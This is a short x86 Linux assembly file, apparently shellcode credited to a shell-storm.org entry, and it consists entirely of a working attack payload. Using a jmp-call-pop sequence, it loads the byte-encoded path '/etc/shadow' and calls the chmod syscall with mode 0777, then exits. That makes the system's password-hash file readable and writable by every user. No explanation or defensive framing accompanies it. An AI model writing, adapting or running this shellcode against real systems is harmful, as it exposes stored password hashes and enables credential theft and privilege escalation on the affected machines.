global _start			
;http://shell-storm.org/shellcode/files/shellcode-590.php
section .text
_start:
	jmp short getFile

goChmod:
	pop ebx
	xor eax, eax
	push eax
	mov al,15
	xor ecx,ecx
	mov cx,511
	int 0x80
	mov al, 0x1	
	int 0x80
	
getFile:
	call goChmod
	dedo: db 0x2f,0x65,0x74,0x63,0x2f,0x73,0x68,0x61,0x64,0x6f,0x77
		;db "/etc/shadow"
